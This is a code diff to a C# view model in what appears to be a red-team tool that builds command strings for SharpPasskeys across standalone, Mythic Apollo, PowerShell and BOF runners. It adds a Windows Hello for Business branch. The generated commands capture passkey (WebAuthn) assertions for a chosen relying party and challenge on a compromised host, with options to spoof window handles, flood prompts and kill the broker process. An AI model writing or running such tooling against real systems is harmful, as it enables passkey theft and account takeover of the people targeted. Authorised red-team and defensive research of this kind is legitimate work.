@@ -72,6 +72,12 @@ public partial class C2CommandsDialogViewModel : ObservableObject, IC2CommandsDi
     public ObservableCollection<string> StandaloneCommands { get; } = [];
 
     /// <summary>
+    /// Gets whether the captured assertion can be signed by the Windows Hello for Business signer.
+    /// </summary>
+    private bool IsWindowsHelloForBusinessApplicable =>
+        string.Equals(_rpId, WindowsHelloForBusinessSigner.RelyingPartyId, StringComparison.OrdinalIgnoreCase);
+
+    /// <summary>
     /// Gets the list of Mythic Apollo SharpPasskeys commands to display.
     /// </summary>
     public ObservableCollection<string> MythicCommands { get; } = [];
@@ -146,6 +152,11 @@ public partial class C2CommandsDialogViewModel : ObservableObject, IC2CommandsDi
 
         string optionalParameters = SharpPasskeysBuildOptionalParameters();
 
+        if (IsWindowsHelloForBusinessApplicable)
+        {
+            StandaloneCommands.Add($"SharpPasskeys.exe whfb{WindowsHelloForBusinessBuildOptionalParameters()} --challenge {_challenge}");
+        }
+
         StandaloneCommands.Add($"SharpPasskeys.exe prompt --relying-party {_rpId}{optionalParameters} --challenge {_challenge}");
 
         foreach (string credentialId in _credentialIds)
@@ -159,6 +170,12 @@ public partial class C2CommandsDialogViewModel : ObservableObject, IC2CommandsDi
         MythicCommands.Clear();
         MythicCommands.Add("register_assembly -existingFile SharpPasskeys.exe");
         MythicCommands.Add("sleep -interval 0");
+
+        if (IsWindowsHelloForBusinessApplicable)
+        {
+            string whfbArgs = $"whfb{WindowsHelloForBusinessBuildOptionalParameters()} --challenge {_challenge}";
+            MythicCommands.Add($"inline_assembly -Assembly SharpPasskeys.exe -Arguments \"{whfbArgs}\"");
+        }
 
         string optionalParameters = SharpPasskeysBuildOptionalParameters();
         string baseArgs = $"prompt --relying-party {_rpId}{optionalParameters} --challenge {_challenge}";
@@ -183,6 +200,11 @@ public partial class C2CommandsDialogViewModel : ObservableObject, IC2CommandsDi
             : string.Empty;
         string windowHandleParameter = SpoofWindowHandle ? " -WindowHandle 0" : string.Empty;
         string privateParameter = BrowserInPrivateMode ? " -BrowserInPrivateMode" : string.Empty;
+
+        if (IsWindowsHelloForBusinessApplicable)
+        {
+            PowerShellCommands.Add($"Test-PasskeyWindowsHelloForBusiness{privateParameter} -Challenge {_challenge}");
+        }
 
         PowerShellCommands.Add(PowerShellPrependKillBroker(PowerShellWrapWithPromptFlood($"Test-Passkey -RelyingPartyId {_rpId}{hintParameter}{windowHandleParameter}{privateParameter} -Challenge {_challenge}")));
 
@@ -224,9 +246,19 @@ public partial class C2CommandsDialogViewModel : ObservableObject, IC2CommandsDi
         return parameters.Count > 0 ? " " + string.Join(" ", parameters) : string.Empty;
     }
 
+    private string WindowsHelloForBusinessBuildOptionalParameters()
+    {
+        return BrowserInPrivateMode ? " --private" : string.Empty;
+    }
+
     private void BofRebuildCommands()
     {
         BofCommands.Clear();
+
+        if (IsWindowsHelloForBusinessApplicable)
+        {
+            BofCommands.Add($"passkeys whfb{WindowsHelloForBusinessBuildBofOptionalParameters()} /challenge:{_challenge}");
+        }
 
         string optionalParameters = BofBuildOptionalParameters();
 
@@ -263,6 +295,11 @@ public partial class C2CommandsDialogViewModel : ObservableObject, IC2CommandsDi
         }
 
         return parameters.Count > 0 ? " " + string.Join(" ", parameters) : string.Empty;
+    }
+
+    private string WindowsHelloForBusinessBuildBofOptionalParameters()
+    {
+        return BrowserInPrivateMode ? " /private" : string.Empty;
     }
 
     private string PowerShellWrapWithPromptFlood(string command)
